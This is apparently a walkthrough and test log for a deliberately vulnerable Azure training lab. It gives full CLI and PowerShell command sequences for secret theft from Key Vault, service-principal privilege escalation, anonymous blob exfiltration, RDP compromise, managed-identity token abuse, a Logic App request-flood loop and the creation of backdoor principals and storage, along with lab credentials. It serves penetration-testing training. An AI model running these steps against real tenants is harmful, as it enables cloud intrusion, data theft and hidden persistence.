# 🗺️ Azure Vulnerable Lab - Complete Attack Map Explanation

## 📊 Attack Overview

**Attacker Profile:**
- **Identity**: pentester.user@matrix3d.com
- **Starting Permissions**: Reader + Key Vault Secrets User + Storage Blob Data Reader
- **Attack Machines**: 
  - Primary: Kali Linux (External attacker machine)
  - Secondary: Windows VM (After compromise)
- **Final Result**: Full Contributor access + Persistent backdoor

---

## 🎯 Attack Phases Breakdown

### **PHASE 1: Initial Access & Reconnaissance**
**Machine**: 🐧 Kali Linux (Attacker's Machine)

#### Step 1.1: Login as Pentester
```bash
az login -u pentester.user@matrix3d.com
```
**From**: Kali Linux  
**Result**: Authenticated with Reader role

#### Step 1.2: Enumerate Resources
```bash
az resource list --resource-group SeasidesTraining --output table
az keyvault list --resource-group SeasidesTraining
az storage account list --resource-group SeasidesTraining
az vm list --resource-group SeasidesTraining --show-details
az identity list --resource-group SeasidesTraining
az network nsg rule list --nsg-name vulnerable-nsg
```

**From**: Kali Linux  
**Discovered**:
- ✅ Key Vault: kv-vuln-4zdn0r (Public network access)
- ✅ Storage Account: stvuln4zdn0r (Anonymous blob access!)
- ✅ VM: 20.219.139.106 (RDP port 3389 open to internet)
- ✅ Managed Identity: vulnerable-managed-identity (has Contributor role)
- ✅ Service Principal: vulnerable-service-principal (Contributor role)
- ✅ NSG: Open RDP, SSH, HTTP, WinRM

**Impact**: Complete map of attack surface identified

---

### **PHASE 2: Key Vault Exploitation (Credential Theft)**
**Machine**: 🐧 Kali Linux

#### Step 2.1: List Secrets
```bash
az keyvault secret list --vault-name kv-vuln-4zdn0r --output table
```

**From**: Kali Linux  
**Permission Used**: Key Vault Secrets User (Get, List)  
**Found Secrets**:
- db-password
- api-key
- service-principal-client-id ⚠️
- service-principal-secret ⚠️

#### Step 2.2: Exfiltrate All Secrets
```bash
DB_PASSWORD=$(az keyvault secret show --vault-name kv-vuln-4zdn0r --name db-password --query value -o tsv)
API_KEY=$(az keyvault secret show --vault-name kv-vuln-4zdn0r --name api-key --query value -o tsv)
SP_CLIENT_ID=$(az keyvault secret show --vault-name kv-vuln-4zdn0r --name service-principal-client-id --query value -o tsv)
SP_SECRET=$(az keyvault secret show --vault-name kv-vuln-4zdn0r --name service-principal-secret --query value -o tsv)
```

**From**: Kali Linux  
**Stolen Data**:
- 🔑 Database Password: `P@ssw0rd123!Secret`
- 🔑 API Key: `sk_live_abcd1234efgh5678ijkl9012mnop`
- 🔥 **Service Principal Client ID**: `1e353573-b8d1-472a-ad1f-b5235b8731ff`
- 🔥 **Service Principal Secret**: `pWQ8Q~wgiICLb1_iYkzrzlkTPNZdIKLFLCT7KaOK`

**Why Critical**: Service Principal has **Contributor role** on entire resource group!

---

### **PHASE 3: Privilege Escalation via Service Principal**
**Machine**: 🐧 Kali Linux

#### Step 3.1: Logout and Login as Service Principal
```bash
az logout

az login --service-principal \
  -u "1e353573-b8d1-472a-ad1f-b5235b8731ff" \
  -p "pWQ8Q~wgiICLb1_iYkzrzlkTPNZdIKLFLCT7KaOK" \
  --tenant "48af3af8-817e-42f2-b1e6-a7407e682b7e"
```

**From**: Kali Linux  
**Result**: 
- ⬆️ **PRIVILEGE ESCALATED!**
- Reader → **Contributor**
- Can now create/modify/delete ANY resource in SeasidesTraining

#### Step 3.2: Verify Access
```bash
az account show
az role assignment list --all --output table
az resource list --resource-group SeasidesTraining
```

**From**: Kali Linux (as Service Principal)  
**New Capabilities**:
- ✅ Create new resources
- ✅ Modify existing resources
- ✅ Delete resources
- ✅ Get storage account keys
- ✅ Modify NSG rules
- ✅ Create backdoor service principals
- ✅ Access all data

**Impact**: Full resource group control achieved!

---

### **PHASE 4: Storage Account Data Exfiltration**
**Machine**: 🐧 Kali Linux

#### Method A: Anonymous Access (No Authentication!)
```bash
# Direct download - NO AUTH REQUIRED!
curl -o "confidential.txt" \
  "https://stvuln4zdn0r.blob.core.windows.net/sensitive-data/confidential.txt"

curl -o "customers.csv" \
  "https://stvuln4zdn0r.blob.core.windows.net/sensitive-data/customers.csv"
```

**From**: Kali Linux (or ANY machine on internet!)  
**Vulnerability**: Container has `container_access_type = "blob"` (anonymous access)  
**No credentials needed**: Anyone with the URL can download!

#### Method B: Using Storage Account Key (As Contributor)
```bash
# Get storage key (Contributor permission)
STORAGE_KEY=$(az storage account keys list \
  --resource-group SeasidesTraining \
  --account-name stvuln4zdn0r \
  --query [0].value -o tsv)

# Download all blobs
az storage blob list \
  --account-name stvuln4zdn0r \
  --container-name sensitive-data \
  --account-key $STORAGE_KEY

az storage blob download \
  --account-name stvuln4zdn0r \
  --container-name sensitive-data \
  --name confidential.txt \
  --file exfiltrated-confidential.txt \
  --account-key $STORAGE_KEY
```

**From**: Kali Linux (as Service Principal - Contributor)  
**Exfiltrated Data**:
- 📄 **confidential.txt**: Database credentials, API keys, Service Principal details
- 📄 **customers.csv**: Customer PII (names, emails, credit card numbers)

**Impact**: Complete data breach - sensitive company and customer data stolen

---

### **PHASE 5: VM Compromise & Managed Identity Abuse**

#### Part A: Network-Based Attack
**Machine**: 🐧 Kali Linux → 🪟 Windows VM

##### Step 5.1: Port Scan
```bash
nmap -p 22,80,3389,5985 20.219.139.106
```

**From**: Kali Linux  
**Discovered**:
- Port 3389 (RDP): OPEN ⚠️
- Port 22 (SSH): OPEN ⚠️
- Source allowed: 0.0.0.0/0 (entire internet!)

##### Step 5.2: RDP Access with Weak Password
```bash
rdesktop 20.219.139.106 -u azureuser -p 'WeakPassword123!'
```

**From**: Kali Linux  
**Credentials**: 
- Username: `azureuser`
- Password: `WeakPassword123!` (weak, guessable)

**Result**: 🔥 **VM COMPROMISED!**

#### Part B: Managed Identity Exploitation
**Machine**: 🪟 Windows VM (Inside compromised VM)

##### Step 5.3: Test Managed Identity (From Inside VM)
```powershell
# Running INSIDE the Windows VM now
$response = Invoke-RestMethod `
  -Uri 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' `
  -Headers @{Metadata="true"}

# Got access token!
$token = $response.access_token
```

**From**: Windows VM (PowerShell inside RDP session)  
**IMDS Endpoint**: 169.254.169.254 (Azure Instance Metadata Service)  
**Result**: Obtained access token for Managed Identity (which has Contributor role!)

##### Step 5.4: Access Key Vault from VM
```powershell
# Get Key Vault access token
$kvToken = (Invoke-RestMethod `
  -Uri 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net' `
  -Headers @{Metadata="true"}).access_token

# Access secrets
$headers = @{Authorization = "Bearer $kvToken"}
Invoke-RestMethod `
  -Uri 'https://kv-vuln-4zdn0r.vault.azure.net/secrets?api-version=7.4' `
  -Headers $headers

# Get specific secret
Invoke-RestMethod `
  -Uri 'https://kv-vuln-4zdn0r.vault.azure.net/secrets/db-password?api-version=7.4' `
  -Headers $headers
```

**From**: Windows VM (using managed identity)  
**Result**: All Key Vault secrets accessible from compromised VM!

##### Step 5.5: Full Resource Access from VM
```powershell
# Get management token
$mgmtToken = (Invoke-RestMethod `
  -Uri 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' `
  -Headers @{Metadata="true"}).access_token

# List all resources (Contributor access)
$headers = @{Authorization = "Bearer $mgmtToken"}
Invoke-RestMethod `
  -Uri 'https://management.azure.com/subscriptions/650ed9ab-493a-4e6f-a4e7-f13e28e5dc6a/resourceGroups/SeasidesTraining/resources?api-version=2021-04-01' `
  -Headers $headers
```

**From**: Windows VM (using managed identity with Contributor role)  
**Capabilities from VM**:
- ✅ List all resources
- ✅ Access Key Vault secrets
- ✅ Get storage account keys
- ✅ Modify NSG rules
- ✅ Create new resources
- ✅ Delete resources

**Impact**: Full Contributor access from compromised VM!

---

### **PHASE 6: Logic App Exploitation**
**Machine**: 🐧 Kali Linux

#### Step 6.1: Get Callback URL
```bash
LOGIC_APP_URL=$(az rest --method post \
  --uri "https://management.azure.com/subscriptions/650ed9ab-493a-4e6f-a4e7-f13e28e5dc6a/resourceGroups/SeasidesTraining/providers/Microsoft.Logic/workflows/vulnerable-workflow/triggers/manual/listCallbackUrl?api-version=2016-06-01" \
  --query value -o tsv)
```

**From**: Kali Linux (as Service Principal - requires authentication)  
**Result**: Got Logic App HTTP trigger callback URL

#### Step 6.2: Trigger Without Authentication
```bash
# Anyone with URL can trigger - NO AUTH!
curl -X POST "$LOGIC_APP_URL" \
  -H "Content-Type: application/json" \
  -d '{"secret": "malicious_data", "action": "exfiltrate"}'
```

**From**: Kali Linux (or anywhere - no authentication required!)  
**Vulnerability**: HTTP trigger has no authentication enabled  
**Result**: Logic App workflow executed

#### Step 6.3: DoS Attack
```bash
# Trigger 100 times
for i in {1..100}; do
  curl -X POST "$LOGIC_APP_URL" \
    -H "Content-Type: application/json" \
    -d "{\"iteration\": $i}" \
    --silent &
done
```

**From**: Kali Linux  
**Impact**: 
- Unlimited workflow executions
- Potential data exfiltration via workflow
- Resource consumption (costs)

---

### **PHASE 7: Establish Persistence**
**Machine**: 🐧 Kali Linux (as Service Principal - Contributor)

#### Step 7.1: Create Backdoor Service Principal
```bash
BACKDOOR_SP=$(az ad sp create-for-rbac \
  --name "legitimate-monitoring-app" \
  --role Contributor \
  --scopes /subscriptions/650ed9ab-493a-4e6f-a4e7-f13e28e5dc6a/resourceGroups/SeasidesTraining)

BACKDOOR_APP_ID=$(echo $BACKDOOR_SP | jq -r '.appId')
BACKDOOR_PASSWORD=$(echo $BACKDOOR_SP | jq -r '.password')
```

**From**: Kali Linux (as Service Principal)  
**Created**: New service principal with Contributor role  
**Name**: "legitimate-monitoring-app" (looks legitimate!)  
**Purpose**: Persistent access even if original SP is revoked

#### Step 7.2: Create Backdoor Storage Account
```bash
BACKDOOR_STORAGE="legitlogs$RANDOM"

az storage account create \
  --name $BACKDOOR_STORAGE \
  --resource-group SeasidesTraining \
  --location "Central India" \
  --sku Standard_LRS \
  --allow-blob-public-access true

# Create public container
az storage container create \
  --name exfiltrated-data \
  --account-name $BACKDOOR_STORAGE \
  --public-access blob
```

**From**: Kali Linux (as Service Principal)  
**Created**: New storage account with public blob access  
**Purpose**: 
- Copy stolen data for persistence
- Publicly accessible for easy exfiltration
- Looks like legitimate logging storage

#### Step 7.3: Copy Data to Backdoor
```bash
# Copy all exfiltrated files to backdoor storage
BACKDOOR_KEY=$(az storage account keys list \
  --account-name $BACKDOOR_STORAGE \
  --query [0].value -o tsv)

az storage blob upload \
  --account-name $BACKDOOR_STORAGE \
  --container-name exfiltrated-data \
  --name confidential.txt \
  --file exfiltrated-confidential.txt \
  --account-key $BACKDOOR_KEY
```

**From**: Kali Linux (as Service Principal)  
**Result**: All stolen data now in attacker-controlled public storage  
**Access**: `https://legitlogsXXXX.blob.core.windows.net/exfiltrated-data/`

---

## 📊 Machine-to-Attack Mapping

| Phase | Machine | Authentication | Actions |
|-------|---------|---------------|---------|
| **1. Reconnaissance** | 🐧 Kali Linux | Pentester user (Reader) | List resources, enumerate |
| **2. Key Vault** | 🐧 Kali Linux | Pentester user | Steal secrets |
| **3. Privilege Escalation** | 🐧 Kali Linux | Service Principal | Login with stolen creds |
| **4. Storage (Anonymous)** | 🐧 Kali Linux | None! | Download via curl |
| **4. Storage (Authenticated)** | 🐧 Kali Linux | Service Principal (Contributor) | Get keys, download |
| **5A. Port Scan** | 🐧 Kali Linux | None | Scan VM ports |
| **5B. RDP Access** | 🐧 Kali → 🪟 VM | Weak password | Compromise VM |
| **5C. Managed Identity** | 🪟 Windows VM | VM's Managed Identity | Access Azure resources |
| **6. Logic App** | 🐧 Kali Linux | None (for trigger) | Unauthenticated execution |
| **7. Persistence** | 🐧 Kali Linux | Service Principal | Create backdoors |

---

## 🔥 Critical Vulnerabilities Exploited

### 1. **IAM Misconfigurations**
- ❌ Service Principal credentials stored in Key Vault
- ❌ Service Principal has Contributor (too broad)
- ❌ Managed Identity has Contributor (overprivileged)
- ❌ Pentester has Key Vault Secrets User (can read SP creds)

### 2. **Key Vault**
- ❌ Public network access enabled
- ❌ No IP restrictions
- ❌ Stores Service Principal secrets (bad practice)
- ❌ Pentester user has Get/List permissions

### 3. **Storage Account**
- ❌ Anonymous blob access (`container_access_type = "blob"`)
- ❌ Public network access
- ❌ Sensitive data in plaintext
- ❌ HTTPS not enforced

### 4. **VM & Network**
- ❌ RDP open to 0.0.0.0/0 (entire internet)
- ❌ Weak password: `WeakPassword123!`
- ❌ VM has Managed Identity with Contributor
- ❌ No JIT (Just-In-Time) access
- ❌ No MFA

### 5. **Logic App**
- ❌ HTTP trigger with NO authentication
- ❌ Publicly accessible callback URL
- ❌ No IP restrictions
- ❌ Can access Key Vault

---

## 🎯 Attack Success Metrics

| Metric | Value |
|--------|-------|
| **Starting Permission** | Reader |
| **Final Permission** | Contributor |
| **Machines Used** | Kali Linux + Windows VM |
| **Credentials Stolen** | 6 (DB, API, SP Client ID, SP Secret, VM password, MI token) |
| **Data Exfiltrated** | 2 files (confidential.txt, customers.csv) |
| **Resources Compromised** | 7 (Key Vault, Storage, VM, NSG, Logic App, MI, SP) |
| **Backdoors Created** | 2 (Backdoor SP, Backdoor Storage) |
| **Time to Compromise** | < 1 hour |
| **Detection Evasion** | No alerts, no monitoring |

---

## 💡 Key Takeaways

1. **Reader role is NOT harmless** - Enabled complete reconnaissance
2. **Never store SP credentials in Key Vault** - Enabled privilege escalation
3. **Anonymous blob access = public data leak** - No authentication needed
4. **Weak passwords + Managed Identity = total compromise** - VM became pivot point
5. **Unauthenticated Logic Apps = anyone can trigger** - No access control
6. **Contributor is too broad** - Should use least privilege

**The Attack Chain**: 
Low privilege (Reader) → Reconnaissance → Credential theft → Privilege escalation → Data exfiltration → VM compromise → Managed Identity abuse → Persistence

**All from standard Azure CLI commands - no special tools needed!** 🎯


### **Test Results (Passed/Failed)**
#### **Phase 1**
```bash
az resource list --resource-group SeasidesTraining 
--output table
```
![alt text](image-1.png)
```bash
az keyvault list --resource-group SeasidesTraining
```
![alt text](image-2.png)
```bash
az storage account list --resource-group SeasidesTraining
```
![alt text](image-3.png)
```bash
az vm list --resource-group SeasidesTraining --show-details
```
![alt text](image-4.png)
```bash
az identity list --resource-group SeasidesTraining
```
![alt text](image-5.png)

<span style="color: red;">Failed Command.</span>

```bash
az network nsg rule list --nsg-name vulnerable-nsg
```
![alt text](image-6.png)

<span style="color: green;">Fixed Command.</span>

```bash
az network nsg rule list --resource-group SeasidesTraining --nsg-name vulnerable-nsg
```
![alt text](image-7.png)

#### **PHASE 2: Key Vault Exploitation (Credential Theft)**

**Step 2.1**
```bash
az keyvault secret list --vault-name kv-vuln-4zdn0r --output table
```
![alt text](image-8.png)

**Step 2.2: Exfiltrate All Secrets**
```bash
DB_PASSWORD=$(az keyvault secret show --vault-name kv-vuln-4zdn0r --name db-password --query value -o tsv)
API_KEY=$(az keyvault secret show --vault-name kv-vuln-4zdn0r --name api-key --query value -o tsv)
SP_CLIENT_ID=$(az keyvault secret show --vault-name kv-vuln-4zdn0r --name service-principal-client-id --query value -o tsv)
SP_SECRET=$(az keyvault secret show --vault-name kv-vuln-4zdn0r --name service-principal-secret --query value -o tsv)
```
![alt text](image-9.png)

**How Secrets are stored in Variables**
![alt text](image-10.png)

#### **PHASE 3: Privilege Escalation via Service Principal**

**Step 3.1: Logout and Login as Service Principal**
```bash
az logout

az login --service-principal \
  -u "1e353573-b8d1-472a-ad1f-b5235b8731ff" \
  -p "pWQ8Q~wgiICLb1_iYkzrzlkTPNZdIKLFLCT7KaOK" \
  --tenant "48af3af8-817e-42f2-b1e6-a7407e682b7e"
```
![alt text](image-11.png)

<span style="color: red;">If this login fails like this</span>

![alt text](image-35.png)

<span style="color: green;"><b>Then add this manually</b></span>

1. Go to **Resource Groups** → **SeasidesTraining**

2. Click **Access control (IAM)**

3. Click **+ Add** → **Add role assignment**

4. **Role** tab:

   * Select **Contributor**
   * Click **Next**

5. **Members** tab:

   * Click **+ Select members**
   * Search for **vulnerable-service-principal**
   * Or paste this **Client ID**:1e353573-b8d1-472a-ad1f-b5235b8731ff

* Select it
* Click **Next**

6. **Review + assign** → **Assign**

**Then It will work**

![alt text](image-36.png)



**Step 3.2: Verify Access**
```bash
az account show
```
![alt text](image-12.png)

<span style="color: red;">Failed Command.</span>

```bash
az role assignment list --all --output table
```
![alt text](image-14.png)

<span style="color: green;">Fixed Command.</span>

```bash
 az role assignment list --all 
 ```
![alt text](image-15.png)
```bash
az resource list --resource-group SeasidesTraining 
```
![alt text](image-16.png)

#### **PHASE 4: Storage Account Data Exfiltration**
**Method A: Anonymous Access (No Authentication!)**
```bash
#Direct download - NO AUTH REQUIRED!
curl -o "confidential.txt" \
  "https://stvuln4zdn0r.blob.core.windows.net/sensitive-data/confidential.txt"
```
![alt text](image-17.png)
![alt text](image-18.png)

```bash
curl -o "customers.csv" \
  "https://stvuln4zdn0r.blob.core.windows.net/sensitive-data/customers.csv"
```
![alt text](image-19.png)

**Method B: Using Storage Account Key (As Contributor)**
```bash
STORAGE_KEY=$(az storage account keys list \
  --resource-group SeasidesTraining \
  --account-name stvuln4zdn0r \
  --query [0].value -o tsv)

az storage blob list \
  --account-name stvuln4zdn0r \
  --container-name sensitive-data \
  --account-key $STORAGE_KEY
```

![alt text](image-20.png)

```bash
az storage blob download \
  --account-name stvuln4zdn0r \
  --container-name sensitive-data \
  --name confidential.txt \
  --file exfiltrated-confidential.txt \
  --account-key $STORAGE_KEY
```
![alt text](image-21.png)

#### **PHASE 5: VM Compromise & Managed Identity Abuse**
**Part A: Network-Based Attack**
**List Ips First**
```bash
az vm list-ip-addresses --resource-group SeasidesTraining
```
![alt text](image-37.png)


**Step 5.1: Port Scan**
```bash
nmap -p 22,80,3389,5985 20.235.102.210
```
<span style="color: green;">Modified Because ping is blocked</span>

```bash
nmap -Pn --open -p 22,80,3389,5985 20.235.102.210
```
![alt text](image-22.png)

**Step 5.2: RDP Access with Weak Password**

<span style="color: red;">Failed Command</span>

```bash
 rdesktop 20.235.102.210 -u azureuser -p 'WeakPassword123!' 
 ```
![alt text](image-23.png)

<span style="color: green;">Fixed/Updated Command</span>

```bash
xfreerdp3 /v:20.235.102.210 /u:azureuser /p:'WeakPassword123!' /cert:ignore
```
![alt text](image-24.png)
![alt text](image-25.png)

**Part B: Managed Identity Exploitation**
**Step 5.3: Test Managed Identity (From Inside VM)**
```bash
# Running INSIDE the Windows VM now
$response = Invoke-RestMethod `
  -Uri 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' `
  -Headers @{Metadata="true"}

# Got access token!
$token = $response.access_token
```
![alt text](image-26.png)

**Step 5.4: Access Key Vault from VM**
```bash
# Get Key Vault access token
$kvToken = (Invoke-RestMethod `
  -Uri 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net' `
  -Headers @{Metadata="true"}).access_token

# Access secrets
$headers = @{Authorization = "Bearer $kvToken"}
Invoke-RestMethod `
  -Uri 'https://kv-vuln-4zdn0r.vault.azure.net/secrets?api-version=7.4' `
  -Headers $headers

# Get specific secret
Invoke-RestMethod `
  -Uri 'https://kv-vuln-4zdn0r.vault.azure.net/secrets/db-password?api-version=7.4' `
  -Headers $headers
```
![alt text](image-27.png)

**Step 5.5: Full Resource Access from VM**


#### **PHASE 6: Logic App Exploitation**

**Step 6.1: Get Callback URL**
```bash
LOGIC_APP_URL=$(az rest --method post \
  --uri "https://management.azure.com/subscriptions/650ed9ab-493a-4e6f-a4e7-f13e28e5dc6a/resourceGroups/SeasidesTraining/providers/Microsoft.Logic/workflows/vulnerable-workflow/triggers/manual/listCallbackUrl?api-version=2016-06-01" \
  --query value -o tsv)
  ```
![alt text](image-28.png)

**Step 6.2: Trigger Without Authentication**
```bash
# Anyone with URL can trigger - NO AUTH!
curl -X POST "$LOGIC_APP_URL" \
  -H "Content-Type: application/json" \
  -d '{"secret": "malicious_data", "action": "exfiltrate"}'
```
![alt text](image-29.png)

**Step 6.3: DoS Attack**
```bash
# Trigger 100 times
for i in {1..100}; do
  curl -X POST "$LOGIC_APP_URL" \
    -H "Content-Type: application/json" \
    -d "{\"iteration\": $i}" \
    --silent &
done
```
![alt text](image-30.png)
![alt text](image-31.png)

#### **PHASE 7: Establish Persistence**
**Step 7.1: Create Backdoor Service Principal**

<span style="color: red;">Failed Command.</span>

```bash
BACKDOOR_SP=$(az ad sp create-for-rbac \
  --name "legitimate-monitoring-app" \
  --role Contributor \
  --scopes /subscriptions/650ed9ab-493a-4e6f-a4e7-f13e28e5dc6a/resourceGroups/SeasidesTraining)

BACKDOOR_APP_ID=$(echo $BACKDOOR_SP | jq -r '.appId')
BACKDOOR_PASSWORD=$(echo $BACKDOOR_SP | jq -r '.password')
```
<span style="color: green;"><b>Fixed Command.</b></span>

**Step 7.2: Create Backdoor Storage Account**
```bash
BACKDOOR_STORAGE="legitlogs$RANDOM"
 
az storage account create \
  --name $BACKDOOR_STORAGE \
  --resource-group SeasidesTraining \
  --location "Central India" \
  --sku Standard_LRS \
  --allow-blob-public-access true
  ```
![alt text](image-32.png)

```bash
# Create public container
az storage container create \
  --name exfiltrated-data \
  --account-name $BACKDOOR_STORAGE \
  --public-access blob
```
![alt text](image-33.png)

#### Step 7.3: Copy Data to Backdoor
```bash
# Copy all exfiltrated files to backdoor storage
BACKDOOR_KEY=$(az storage account keys list \
  --account-name $BACKDOOR_STORAGE \
  --query [0].value -o tsv)

az storage blob upload \
  --account-name $BACKDOOR_STORAGE \
  --container-name exfiltrated-data \
  --name confidential.txt \
  --file exfiltrated-confidential.txt \
  --account-key $BACKDOOR_KEY
```
![alt text](image-34.png)




